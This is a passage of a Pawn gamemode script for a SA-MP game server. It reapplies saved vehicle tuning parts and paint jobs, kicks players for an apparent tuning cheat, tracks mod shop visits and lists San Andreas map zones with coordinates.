            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod5]);
        }
        if(PlayerInfo[playerid][cMod6] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod6]);
        }
        if(PlayerInfo[playerid][cMod7] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod7]);
        }
        if(PlayerInfo[playerid][cMod8] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod8]);
        }
        if(PlayerInfo[playerid][cMod9] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod9]);
        }
        if(PlayerInfo[playerid][cMod10] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod10]);
        }
        if(PlayerInfo[playerid][cMod11] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod11]);
        }
        if(PlayerInfo[playerid][cMod12] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod12]);
        }
        if(PlayerInfo[playerid][cMod13] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod13]);
        }
        if(PlayerInfo[playerid][cMod14] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod14]);
        }
        if(PlayerInfo[playerid][cMod15] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod15]);
        }
        if(PlayerInfo[playerid][cMod16] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod16]);
        }
        if(PlayerInfo[playerid][cMod17] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod17]);
        }
        if(PlayerInfo[playerid][cPaintJob] != 3) {
        ChangeVehiclePaintjob(vehicleid,PlayerInfo[playerid][cPaintJob]);
        }
    }
    if(OwnedMashin_2[vehicleid] != 0)
    {
        if(PlayerInfo[playerid][cMod1_2] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod1_2]);
        }
        if(PlayerInfo[playerid][cMod3_2] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod3_2]);
        }
        if(PlayerInfo[playerid][cMod4_2] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod4_2]);
        }
        if(PlayerInfo[playerid][cMod5_2] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod5_2]);
        }
        if(PlayerInfo[playerid][cMod6_2] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod6_2]);
        }
        if(PlayerInfo[playerid][cMod7_2] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod7_2]);
        }
        if(PlayerInfo[playerid][cMod8_2] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod8_2]);
        }
        if(PlayerInfo[playerid][cMod9_2] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod9_2]);
        }
        if(PlayerInfo[playerid][cMod10_2] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod10_2]);
        }
        if(PlayerInfo[playerid][cMod11_2] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod11_2]);
        }
        if(PlayerInfo[playerid][cMod12_2] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod12_2]);
        }
        if(PlayerInfo[playerid][cMod13_2] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod13_2]);
        }
        if(PlayerInfo[playerid][cMod14_2] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod14_2]);
        }
        if(PlayerInfo[playerid][cMod15_2] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod15_2]);
        }
        if(PlayerInfo[playerid][cMod16_2] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod16_2]);
        }
        if(PlayerInfo[playerid][cMod17_2] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod17_2]);
        }
        if(PlayerInfo[playerid][cPaintJob_2] != 3) {
        ChangeVehiclePaintjob(vehicleid,PlayerInfo[playerid][cPaintJob_2]);
        }
    }
}

public OnVehicleMod(playerid,vehicleid,componentid)
{
	if(GetPlayerInterior(playerid) == 0) KickAntiCheat(playerid,"Tuning Hack");
    if((OwnedMashin[vehicleid] == 1 && IsPlayerConnected(MashinOwner[vehicleid])) || (OwnedMashin_2[vehicleid] == 1 && IsPlayerConnected(MashinOwner_2[vehicleid])))
    {
        SaveComponent(vehicleid, componentid);
    }
    return 1;
}
/*----------------------------------------------------------------------------*/
public OnEnterExitModShop(playerid, enterexit, interiorid)
{
	if(enterexit == 1) {
		InModShop[playerid] = 1;
		ModShopS[playerid] = 1;
	}
    if(enterexit == 0)
    {
        SetTimerEx("KamKonTune", 700, 0, "i", playerid);
		SetTimerEx("ModShopExit", 5000, 0, "i", playerid);
		InModShop[playerid] = 0;
    }
    return 1;
}
forward ModShopExit(playerid);
public ModShopExit(playerid) {
ModShopS[playerid] = 0;
return 1;
}
/*--------------------------------Places Name---------------------------------*/
static const gSAZones[][SAZONE_MAIN] = {
    {"The Big Ear",                 {-410.00,1403.30,-3.00,-137.90,1681.20,200.00}},
    {"Aldea Malvada",               {-1372.10,2498.50,0.00,-1277.50,2615.30,200.00}},
    {"Angel Pine",                  {-2324.90,-2584.20,-6.10,-1964.20,-2212.10,200.00}},
    {"Arco del Oeste",              {-901.10,2221.80,0.00,-592.00,2571.90,200.00}},
    {"Avispa Country Club",         {-2646.40,-355.40,0.00,-2270.00,-222.50,200.00}},
    {"Avispa Country Club",         {-2831.80,-430.20,-6.10,-2646.40,-222.50,200.00}},
    {"Avispa Country Club",         {-2361.50,-417.10,0.00,-2270.00,-355.40,200.00}},
    {"Avispa Country Club",         {-2667.80,-302.10,-28.80,-2646.40,-262.30,71.10}},
    {"Avispa Country Club",         {-2470.00,-355.40,0.00,-2270.00,-318.40,46.10}},
    {"Avispa Country Club",         {-2550.00,-355.40,0.00,-2470.00,-318.40,39.70}},
    {"Back o Beyond",               {-1166.90,-2641.10,0.00,-321.70,-1856.00,200.00}},
    {"Battery Point",               {-2741.00,1268.40,-4.50,-2533.00,1490.40,200.00}},
    {"Bayside",                     {-2741.00,2175.10,0.00,-2353.10,2722.70,200.00}},
    {"Bayside Marina",              {-2353.10,2275.70,0.00,-2153.10,2475.70,200.00}},
    {"Beacon Hill",                 {-399.60,-1075.50,-1.40,-319.00,-977.50,198.50}},
    {"Blackfield",                  {964.30,1203.20,-89.00,1197.30,1403.20,110.90}},
    {"Blackfield",                  {964.30,1403.20,-89.00,1197.30,1726.20,110.90}},
    {"Blackfield Chapel",           {1375.60,596.30,-89.00,1558.00,823.20,110.90}},
    {"Blackfield Chapel",           {1325.60,596.30,-89.00,1375.60,795.00,110.90}},
    {"Blackfield Intersection",     {1197.30,1044.60,-89.00,1277.00,1163.30,110.90}},
    {"Blackfield Intersection",     {1166.50,795.00,-89.00,1375.60,1044.60,110.90}},
    {"Blackfield Intersection",     {1277.00,1044.60,-89.00,1315.30,1087.60,110.90}},
    {"Blackfield Intersection",     {1375.60,823.20,-89.00,1457.30,919.40,110.90}},
    {"Blueberry",                   {104.50,-220.10,2.30,349.60,152.20,200.00}},
    {"Blueberry",                   {19.60,-404.10,3.80,349.60,-220.10,200.00}},
    {"Blueberry Acres",             {-319.60,-220.10,0.00,104.50,293.30,200.00}},
    {"Caligula's Palace",           {2087.30,1543.20,-89.00,2437.30,1703.20,110.90}},
    {"Caligula's Palace",           {2137.40,1703.20,-89.00,2437.30,1783.20,110.90}},
    {"Calton Heights",              {-2274.10,744.10,-6.10,-1982.30,1358.90,200.00}},
    {"Chinatown",                   {-2274.10,578.30,-7.60,-2078.60,744.10,200.00}},
    {"City Hall",                   {-2867.80,277.40,-9.10,-2593.40,458.40,200.00}},
    {"Come-A-Lot",                  {2087.30,943.20,-89.00,2623.10,1203.20,110.90}},
    {"Commerce",                    {1323.90,-1842.20,-89.00,1701.90,-1722.20,110.90}},
    {"Commerce",                    {1323.90,-1722.20,-89.00,1440.90,-1577.50,110.90}},
    {"Commerce",                    {1370.80,-1577.50,-89.00,1463.90,-1384.90,110.90}},
    {"Commerce",                    {1463.90,-1577.50,-89.00,1667.90,-1430.80,110.90}},
    {"Commerce",                    {1583.50,-1722.20,-89.00,1758.90,-1577.50,110.90}},
    {"Commerce",                    {1667.90,-1577.50,-89.00,1812.60,-1430.80,110.90}},
    {"Conference Center",           {1046.10,-1804.20,-89.00,1323.90,-1722.20,110.90}},
    {"Conference Center",           {1073.20,-1842.20,-89.00,1323.90,-1804.20,110.90}},
    {"Cranberry Station",           {-2007.80,56.30,0.00,-1922.00,224.70,100.00}},
    {"Creek",                       {2749.90,1937.20,-89.00,2921.60,2669.70,110.90}},
    {"Dillimore",                   {580.70,-674.80,-9.50,861.00,-404.70,200.00}},
    {"Doherty",                     {-2270.00,-324.10,-0.00,-1794.90,-222.50,200.00}},
    {"Doherty",                     {-2173.00,-222.50,-0.00,-1794.90,265.20,200.00}},
    {"Downtown",                    {-1982.30,744.10,-6.10,-1871.70,1274.20,200.00}},
    {"Downtown",                    {-1871.70,1176.40,-4.50,-1620.30,1274.20,200.00}},
    {"Downtown",                    {-1700.00,744.20,-6.10,-1580.00,1176.50,200.00}},
    {"Downtown",                    {-1580.00,744.20,-6.10,-1499.80,1025.90,200.00}},
    {"Downtown",                    {-2078.60,578.30,-7.60,-1499.80,744.20,200.00}},
    {"Downtown",                    {-1993.20,265.20,-9.10,-1794.90,578.30,200.00}},
    {"Downtown Los Santos",         {1463.90,-1430.80,-89.00,1724.70,-1290.80,110.90}},
    {"Downtown Los Santos",         {1724.70,-1430.80,-89.00,1812.60,-1250.90,110.90}},
    {"Downtown Los Santos",         {1463.90,-1290.80,-89.00,1724.70,-1150.80,110.90}},
    {"Downtown Los Santos",         {1370.80,-1384.90,-89.00,1463.90,-1170.80,110.90}},
    {"Downtown Los Santos",         {1724.70,-1250.90,-89.00,1812.60,-1150.80,110.90}},
    {"Downtown Los Santos",         {1370.80,-1170.80,-89.00,1463.90,-1130.80,110.90}},
    {"Downtown Los Santos",         {1378.30,-1130.80,-89.00,1463.90,-1026.30,110.90}},
    {"Downtown Los Santos",         {1391.00,-1026.30,-89.00,1463.90,-926.90,110.90}},
    {"Downtown Los Santos",         {1507.50,-1385.20,110.90,1582.50,-1325.30,335.90}},
    {"East Beach",                  {2632.80,-1852.80,-89.00,2959.30,-1668.10,110.90}},
    {"East Beach",                  {2632.80,-1668.10,-89.00,2747.70,-1393.40,110.90}},
    {"East Beach",                  {2747.70,-1668.10,-89.00,2959.30,-1498.60,110.90}},
    {"East Beach",                  {2747.70,-1498.60,-89.00,2959.30,-1120.00,110.90}},
    {"East Los Santos",             {2421.00,-1628.50,-89.00,2632.80,-1454.30,110.90}},
    {"East Los Santos",             {2222.50,-1628.50,-89.00,2421.00,-1494.00,110.90}},
    {"East Los Santos",             {2266.20,-1494.00,-89.00,2381.60,-1372.00,110.90}},
    {"East Los Santos",             {2381.60,-1494.00,-89.00,2421.00,-1454.30,110.90}},
    {"East Los Santos",             {2281.40,-1372.00,-89.00,2381.60,-1135.00,110.90}},
    {"East Los Santos",             {2381.60,-1454.30,-89.00,2462.10,-1135.00,110.90}},
    {"East Los Santos",             {2462.10,-1454.30,-89.00,2581.70,-1135.00,110.90}},
    {"Easter Basin",                {-1794.90,249.90,-9.10,-1242.90,578.30,200.00}},
    {"Easter Basin",                {-1794.90,-50.00,-0.00,-1499.80,249.90,200.00}},
    {"Easter Bay Airport",          {-1499.80,-50.00,-0.00,-1242.90,249.90,200.00}},
    {"Easter Bay Airport",          {-1794.90,-730.10,-3.00,-1213.90,-50.00,200.00}},
    {"Easter Bay Airport",          {-1213.90,-730.10,0.00,-1132.80,-50.00,200.00}},
    {"Easter Bay Airport",          {-1242.90,-50.00,0.00,-1213.90,578.30,200.00}},
    {"Easter Bay Airport",          {-1213.90,-50.00,-4.50,-947.90,578.30,200.00}},
    {"Easter Bay Airport",          {-1315.40,-405.30,15.40,-1264.40,-209.50,25.40}},
    {"Easter Bay Airport",          {-1354.30,-287.30,15.40,-1315.40,-209.50,25.40}},
    {"Easter Bay Airport",          {-1490.30,-209.50,15.40,-1264.40,-148.30,25.40}},
    {"Easter Bay Chemicals",        {-1132.80,-768.00,0.00,-956.40,-578.10,200.00}},
    {"Easter Bay Chemicals",        {-1132.80,-787.30,0.00,-956.40,-768.00,200.00}},
    {"El Castillo del Diablo",      {-464.50,2217.60,0.00,-208.50,2580.30,200.00}},
    {"El Castillo del Diablo",      {-208.50,2123.00,-7.60,114.00,2337.10,200.00}},
    {"El Castillo del Diablo",      {-208.50,2337.10,0.00,8.40,2487.10,200.00}},
    {"El Corona",                   {1812.60,-2179.20,-89.00,1970.60,-1852.80,110.90}},
    {"El Corona",                   {1692.60,-2179.20,-89.00,1812.60,-1842.20,110.90}},
    {"El Quebrados",                {-1645.20,2498.50,0.00,-1372.10,2777.80,200.00}},
    {"Esplanade East",              {-1620.30,1176.50,-4.50,-1580.00,1274.20,200.00}},
    {"Esplanade East",              {-1580.00,1025.90,-6.10,-1499.80,1274.20,200.00}},
    {"Esplanade East",              {-1499.80,578.30,-79.60,-1339.80,1274.20,20.30}},
    {"Esplanade North",             {-2533.00,1358.90,-4.50,-1996.60,1501.20,200.00}},
    {"Esplanade North",             {-1996.60,1358.90,-4.50,-1524.20,1592.50,200.00}},
    {"Esplanade North",             {-1982.30,1274.20,-4.50,-1524.20,1358.90,200.00}},
    {"Fallen Tree",                 {-792.20,-698.50,-5.30,-452.40,-380.00,200.00}},
    {"Fallow Bridge",               {434.30,366.50,0.00,603.00,555.60,200.00}},
    {"Fern Ridge",                  {508.10,-139.20,0.00,1306.60,119.50,200.00}},
    {"Financial",                   {-1871.70,744.10,-6.10,-1701.30,1176.40,300.00}},
    {"Fisher's Lagoon",             {1916.90,-233.30,-100.00,2131.70,13.80,200.00}},
    {"Flint Intersection",          {-187.70,-1596.70,-89.00,17.00,-1276.60,110.90}},
    {"Flint Range",                 {-594.10,-1648.50,0.00,-187.70,-1276.60,200.00}},
    {"Fort Carson",                 {-376.20,826.30,-3.00,123.70,1220.40,200.00}},
    {"Foster Valley",               {-2270.00,-430.20,-0.00,-2178.60,-324.10,200.00}},
    {"Foster Valley",               {-2178.60,-599.80,-0.00,-1794.90,-324.10,200.00}},
    {"Foster Valley",               {-2178.60,-1115.50,0.00,-1794.90,-599.80,200.00}},
    {"Foster Valley",               {-2178.60,-1250.90,0.00,-1794.90,-1115.50,200.00}},
    {"Frederick Bridge",            {2759.20,296.50,0.00,2774.20,594.70,200.00}},
    {"Gant Bridge",                 {-2741.40,1659.60,-6.10,-2616.40,2175.10,200.00}},
    {"Gant Bridge",                 {-2741.00,1490.40,-6.10,-2616.40,1659.60,200.00}},
    {"Ganton",                      {2222.50,-1852.80,-89.00,2632.80,-1722.30,110.90}},
    {"Ganton",                      {2222.50,-1722.30,-89.00,2632.80,-1628.50,110.90}},
    {"Garcia",                      {-2411.20,-222.50,-0.00,-2173.00,265.20,200.00}},
    {"Garcia",                      {-2395.10,-222.50,-5.30,-2354.00,-204.70,200.00}},
    {"Garver Bridge",               {-1339.80,828.10,-89.00,-1213.90,1057.00,110.90}},
    {"Garver Bridge",               {-1213.90,950.00,-89.00,-1087.90,1178.90,110.90}},
    {"Garver Bridge",               {-1499.80,696.40,-179.60,-1339.80,925.30,20.30}},
    {"Glen Park",                   {1812.60,-1449.60,-89.00,1996.90,-1350.70,110.90}},
    {"Glen Park",                   {1812.60,-1100.80,-89.00,1994.30,-973.30,110.90}},
    {"Glen Park",                   {1812.60,-1350.70,-89.00,2056.80,-1100.80,110.90}},
    {"Green Palms",                 {176.50,1305.40,-3.00,338.60,1520.70,200.00}},
    {"Greenglass College",          {964.30,1044.60,-89.00,1197.30,1203.20,110.90}},
    {"Greenglass College",          {964.30,930.80,-89.00,1166.50,1044.60,110.90}},
    {"Hampton Barns",               {603.00,264.30,0.00,761.90,366.50,200.00}},
    {"Hankypanky Point",            {2576.90,62.10,0.00,2759.20,385.50,200.00}},
    {"Harry Gold Parkway",          {1777.30,863.20,-89.00,1817.30,2342.80,110.90}},
    {"Hashbury",                    {-2593.40,-222.50,-0.00,-2411.20,54.70,200.00}},
    {"Hilltop Farm",                {967.30,-450.30,-3.00,1176.70,-217.90,200.00}},
    {"Hunter Quarry",               {337.20,710.80,-115.20,860.50,1031.70,203.70}},
    {"Idlewood",                    {1812.60,-1852.80,-89.00,1971.60,-1742.30,110.90}},
    {"Idlewood",                    {1812.60,-1742.30,-89.00,1951.60,-1602.30,110.90}},
    {"Idlewood",                    {1951.60,-1742.30,-89.00,2124.60,-1602.30,110.90}},
    {"Idlewood",                    {1812.60,-1602.30,-89.00,2124.60,-1449.60,110.90}},
    {"Idlewood",                    {2124.60,-1742.30,-89.00,2222.50,-1494.00,110.90}},
    {"Idlewood",                    {1971.60,-1852.80,-89.00,2222.50,-1742.30,110.90}},
    {"Jefferson",                   {1996.90,-1449.60,-89.00,2056.80,-1350.70,110.90}},
    {"Jefferson",                   {2124.60,-1494.00,-89.00,2266.20,-1449.60,110.90}},
    {"Jefferson",                   {2056.80,-1372.00,-89.00,2281.40,-1210.70,110.90}},
    {"Jefferson",                   {2056.80,-1210.70,-89.00,2185.30,-1126.30,110.90}},
    {"Jefferson",                   {2185.30,-1210.70,-89.00,2281.40,-1154.50,110.90}},
    {"Jefferson",                   {2056.80,-1449.60,-89.00,2266.20,-1372.00,110.90}},
    {"Julius Thruway East",         {2623.10,943.20,-89.00,2749.90,1055.90,110.90}},
    {"Julius Thruway East",         {2685.10,1055.90,-89.00,2749.90,2626.50,110.90}},
    {"Julius Thruway East",         {2536.40,2442.50,-89.00,2685.10,2542.50,110.90}},
    {"Julius Thruway East",         {2625.10,2202.70,-89.00,2685.10,2442.50,110.90}},
    {"Julius Thruway North",        {2498.20,2542.50,-89.00,2685.10,2626.50,110.90}},
    {"Julius Thruway North",        {2237.40,2542.50,-89.00,2498.20,2663.10,110.90}},
    {"Julius Thruway North",        {2121.40,2508.20,-89.00,2237.40,2663.10,110.90}},
    {"Julius Thruway North",        {1938.80,2508.20,-89.00,2121.40,2624.20,110.90}},
    {"Julius Thruway North",        {1534.50,2433.20,-89.00,1848.40,2583.20,110.90}},
    {"Julius Thruway North",        {1848.40,2478.40,-89.00,1938.80,2553.40,110.90}},
    {"Julius Thruway North",        {1704.50,2342.80,-89.00,1848.40,2433.20,110.90}},
    {"Julius Thruway North",        {1377.30,2433.20,-89.00,1534.50,2507.20,110.90}},
    {"Julius Thruway South",        {1457.30,823.20,-89.00,2377.30,863.20,110.90}},
    {"Julius Thruway South",        {2377.30,788.80,-89.00,2537.30,897.90,110.90}},
    {"Julius Thruway West",         {1197.30,1163.30,-89.00,1236.60,2243.20,110.90}},
    {"Julius Thruway West",         {1236.60,2142.80,-89.00,1297.40,2243.20,110.90}},
    {"Juniper Hill",                {-2533.00,578.30,-7.60,-2274.10,968.30,200.00}},
    {"Juniper Hollow",              {-2533.00,968.30,-6.10,-2274.10,1358.90,200.00}},
    {"K.A.C.C. Military Fuels",     {2498.20,2626.50,-89.00,2749.90,2861.50,110.90}},
    {"Kincaid Bridge",              {-1339.80,599.20,-89.00,-1213.90,828.10,110.90}},
    {"Kincaid Bridge",              {-1213.90,721.10,-89.00,-1087.90,950.00,110.90}},
    {"Kincaid Bridge",              {-1087.90,855.30,-89.00,-961.90,986.20,110.90}},
    {"King's",                      {-2329.30,458.40,-7.60,-1993.20,578.30,200.00}},
    {"King's",                      {-2411.20,265.20,-9.10,-1993.20,373.50,200.00}},
    {"King's",                      {-2253.50,373.50,-9.10,-1993.20,458.40,200.00}},
    {"LVA Freight Depot",           {1457.30,863.20,-89.00,1777.40,1143.20,110.90}},
    {"LVA Freight Depot",           {1375.60,919.40,-89.00,1457.30,1203.20,110.90}},
    {"LVA Freight Depot",           {1277.00,1087.60,-89.00,1375.60,1203.20,110.90}},
    {"LVA Freight Depot",           {1315.30,1044.60,-89.00,1375.60,1087.60,110.90}},
    {"LVA Freight Depot",           {1236.60,1163.40,-89.00,1277.00,1203.20,110.90}},
    {"Las Barrancas",               {-926.10,1398.70,-3.00,-719.20,1634.60,200.00}},
    {"Las Brujas",                  {-365.10,2123.00,-3.00,-208.50,2217.60,200.00}},
    {"Las Colinas",                 {1994.30,-1100.80,-89.00,2056.80,-920.80,110.90}},
    {"Las Colinas",                 {2056.80,-1126.30,-89.00,2126.80,-920.80,110.90}},
    {"Las Colinas",                 {2185.30,-1154.50,-89.00,2281.40,-934.40,110.90}},
    {"Las Colinas",                 {2126.80,-1126.30,-89.00,2185.30,-934.40,110.90}},
    {"Las Colinas",                 {2747.70,-1120.00,-89.00,2959.30,-945.00,110.90}},
    {"Las Colinas",                 {2632.70,-1135.00,-89.00,2747.70,-945.00,110.90}},
    {"Las Colinas",                 {2281.40,-1135.00,-89.00,2632.70,-945.00,110.90}},
    {"Las Payasadas",               {-354.30,2580.30,2.00,-133.60,2816.80,200.00}},
    {"Las Venturas Airport",        {1236.60,1203.20,-89.00,1457.30,1883.10,110.90}},
    {"Las Venturas Airport",        {1457.30,1203.20,-89.00,1777.30,1883.10,110.90}},
    {"Las Venturas Airport",        {1457.30,1143.20,-89.00,1777.40,1203.20,110.90}},
    {"Las Venturas Airport",        {1515.80,1586.40,-12.50,1729.90,1714.50,87.50}},
    {"Last Dime Motel",             {1823.00,596.30,-89.00,1997.20,823.20,110.90}},
    {"Leafy Hollow",                {-1166.90,-1856.00,0.00,-815.60,-1602.00,200.00}},
    {"Liberty City",                {-1000.00,400.00,1300.00,-700.00,600.00,1400.00}},
    {"Lil' Probe Inn",              {-90.20,1286.80,-3.00,153.80,1554.10,200.00}},
    {"Linden Side",                 {2749.90,943.20,-89.00,2923.30,1198.90,110.90}},
    {"Linden Station",              {2749.90,1198.90,-89.00,2923.30,1548.90,110.90}},
    {"Linden Station",              {2811.20,1229.50,-39.50,2861.20,1407.50,60.40}},
    {"Little Mexico",               {1701.90,-1842.20,-89.00,1812.60,-1722.20,110.90}},
    {"Little Mexico",               {1758.90,-1722.20,-89.00,1812.60,-1577.50,110.90}},
    {"Los Flores",                  {2581.70,-1454.30,-89.00,2632.80,-1393.40,110.90}},
    {"Los Flores",                  {2581.70,-1393.40,-89.00,2747.70,-1135.00,110.90}},
    {"Los Santos International",    {1249.60,-2394.30,-89.00,1852.00,-2179.20,110.90}},
    {"Los Santos International",    {1852.00,-2394.30,-89.00,2089.00,-2179.20,110.90}},
    {"Los Santos International",    {1382.70,-2730.80,-89.00,2201.80,-2394.30,110.90}},
    {"Los Santos International",    {1974.60,-2394.30,-39.00,2089.00,-2256.50,60.90}},
    {"Los Santos International",    {1400.90,-2669.20,-39.00,2189.80,-2597.20,60.90}},
    {"Los Santos International",    {2051.60,-2597.20,-39.00,2152.40,-2394.30,60.90}},
    {"Marina",                      {647.70,-1804.20,-89.00,851.40,-1577.50,110.90}},
    {"Marina",                      {647.70,-1577.50,-89.00,807.90,-1416.20,110.90}},
    {"Marina",                      {807.90,-1577.50,-89.00,926.90,-1416.20,110.90}},
    {"Market",                      {787.40,-1416.20,-89.00,1072.60,-1310.20,110.90}},
    {"Market",                      {952.60,-1310.20,-89.00,1072.60,-1130.80,110.90}},
    {"Market",                      {1072.60,-1416.20,-89.00,1370.80,-1130.80,110.90}},
    {"Market",                      {926.90,-1577.50,-89.00,1370.80,-1416.20,110.90}},
    {"Market Station",              {787.40,-1410.90,-34.10,866.00,-1310.20,65.80}},
    {"Martin Bridge",               {-222.10,293.30,0.00,-122.10,476.40,200.00}},
    {"Missionary Hill",             {-2994.40,-811.20,0.00,-2178.60,-430.20,200.00}},
    {"Montgomery",                  {1119.50,119.50,-3.00,1451.40,493.30,200.00}},
    {"Montgomery",                  {1451.40,347.40,-6.10,1582.40,420.80,200.00}},
    {"Montgomery Intersection",     {1546.60,208.10,0.00,1745.80,347.40,200.00}},
    {"Montgomery Intersection",     {1582.40,347.40,0.00,1664.60,401.70,200.00}},
    {"Mulholland",                  {1414.00,-768.00,-89.00,1667.60,-452.40,110.90}},
    {"Mulholland",                  {1281.10,-452.40,-89.00,1641.10,-290.90,110.90}},
    {"Mulholland",                  {1269.10,-768.00,-89.00,1414.00,-452.40,110.90}},
    {"Mulholland",                  {1357.00,-926.90,-89.00,1463.90,-768.00,110.90}},
    {"Mulholland",                  {1318.10,-910.10,-89.00,1357.00,-768.00,110.90}},
    {"Mulholland",                  {1169.10,-910.10,-89.00,1318.10,-768.00,110.90}},
    {"Mulholland",                  {768.60,-954.60,-89.00,952.60,-860.60,110.90}},
    {"Mulholland",                  {687.80,-860.60,-89.00,911.80,-768.00,110.90}},
    {"Mulholland",                  {737.50,-768.00,-89.00,1142.20,-674.80,110.90}},
    {"Mulholland",                  {1096.40,-910.10,-89.00,1169.10,-768.00,110.90}},
    {"Mulholland",                  {952.60,-937.10,-89.00,1096.40,-860.60,110.90}},
    {"Mulholland",                  {911.80,-860.60,-89.00,1096.40,-768.00,110.90}},
    {"Mulholland",                  {861.00,-674.80,-89.00,1156.50,-600.80,110.90}},
    {"Mulholland Intersection",     {1463.90,-1150.80,-89.00,1812.60,-768.00,110.90}},
    {"North Rock",                  {2285.30,-768.00,0.00,2770.50,-269.70,200.00}},
    {"Ocean Docks",                 {2373.70,-2697.00,-89.00,2809.20,-2330.40,110.90}},
    {"Ocean Docks",                 {2201.80,-2418.30,-89.00,2324.00,-2095.00,110.90}},
    {"Ocean Docks",                 {2324.00,-2302.30,-89.00,2703.50,-2145.10,110.90}},
    {"Ocean Docks",                 {2089.00,-2394.30,-89.00,2201.80,-2235.80,110.90}},
    {"Ocean Docks",                 {2201.80,-2730.80,-89.00,2324.00,-2418.30,110.90}},
    {"Ocean Docks",                 {2703.50,-2302.30,-89.00,2959.30,-2126.90,110.90}},
    {"Ocean Docks",                 {2324.00,-2145.10,-89.00,2703.50,-2059.20,110.90}},
    {"Ocean Flats",                 {-2994.40,277.40,-9.10,-2867.80,458.40,200.00}},
    {"Ocean Flats",                 {-2994.40,-222.50,-0.00,-2593.40,277.40,200.00}},
    {"Ocean Flats",                 {-2994.40,-430.20,-0.00,-2831.80,-222.50,200.00}},
    {"Octane Springs",              {338.60,1228.50,0.00,664.30,1655.00,200.00}},
    {"Old Venturas Strip",          {2162.30,2012.10,-89.00,2685.10,2202.70,110.90}},
    {"Palisades",                   {-2994.40,458.40,-6.10,-2741.00,1339.60,200.00}},
    {"Palomino Creek",              {2160.20,-149.00,0.00,2576.90,228.30,200.00}},
    {"Paradiso",                    {-2741.00,793.40,-6.10,-2533.00,1268.40,200.00}},
    {"Pershing Square",             {1440.90,-1722.20,-89.00,1583.50,-1577.50,110.90}},
    {"Pilgrim",                     {2437.30,1383.20,-89.00,2624.40,1783.20,110.90}},
    {"Pilgrim",                     {2624.40,1383.20,-89.00,2685.10,1783.20,110.90}},
    {"Pilson Intersection",         {1098.30,2243.20,-89.00,1377.30,2507.20,110.90}},
    {"Pirates in Men's Pants",      {1817.30,1469.20,-89.00,2027.40,1703.20,110.90}},
    {"Playa del Seville",           {2703.50,-2126.90,-89.00,2959.30,-1852.80,110.90}},
    {"Prickle Pine",                {1534.50,2583.20,-89.00,1848.40,2863.20,110.90}},
    {"Prickle Pine",                {1117.40,2507.20,-89.00,1534.50,2723.20,110.90}},
    {"Prickle Pine",                {1848.40,2553.40,-89.00,1938.80,2863.20,110.90}},
    {"Prickle Pine",                {1938.80,2624.20,-89.00,2121.40,2861.50,110.90}},
    {"Queens",                      {-2533.00,458.40,0.00,-2329.30,578.30,200.00}},
    {"Queens",                      {-2593.40,54.70,0.00,-2411.20,458.40,200.00}},
    {"Queens",                      {-2411.20,373.50,0.00,-2253.50,458.40,200.00}},
    {"Randolph Industrial Estate",  {1558.00,596.30,-89.00,1823.00,823.20,110.90}},
    {"Redsands East",               {1817.30,2011.80,-89.00,2106.70,2202.70,110.90}},
    {"Redsands East",               {1817.30,2202.70,-89.00,2011.90,2342.80,110.90}},
    {"Redsands East",               {1848.40,2342.80,-89.00,2011.90,2478.40,110.90}},
    {"Redsands West",               {1236.60,1883.10,-89.00,1777.30,2142.80,110.90}},
    {"Redsands West",               {1297.40,2142.80,-89.00,1777.30,2243.20,110.90}},
    {"Redsands West",               {1377.30,2243.20,-89.00,1704.50,2433.20,110.90}},
    {"Redsands West",               {1704.50,2243.20,-89.00,1777.30,2342.80,110.90}},
    {"Regular Tom",                 {-405.70,1712.80,-3.00,-276.70,1892.70,200.00}},
    {"Richman",                     {647.50,-1118.20,-89.00,787.40,-954.60,110.90}},
    {"Richman",                     {647.50,-954.60,-89.00,768.60,-860.60,110.90}},
    {"Richman",                     {225.10,-1369.60,-89.00,334.50,-1292.00,110.90}},
    {"Richman",                     {225.10,-1292.00,-89.00,466.20,-1235.00,110.90}},
    {"Richman",                     {72.60,-1404.90,-89.00,225.10,-1235.00,110.90}},
    {"Richman",                     {72.60,-1235.00,-89.00,321.30,-1008.10,110.90}},
    {"Richman",                     {321.30,-1235.00,-89.00,647.50,-1044.00,110.90}},
    {"Richman",                     {321.30,-1044.00,-89.00,647.50,-860.60,110.90}},
    {"Richman",                     {321.30,-860.60,-89.00,687.80,-768.00,110.90}},
    {"Richman",                     {321.30,-768.00,-89.00,700.70,-674.80,110.90}},
    {"Robada Intersection",         {-1119.00,1178.90,-89.00,-862.00,1351.40,110.90}},
    {"Roca Escalante",              {2237.40,2202.70,-89.00,2536.40,2542.50,110.90}},
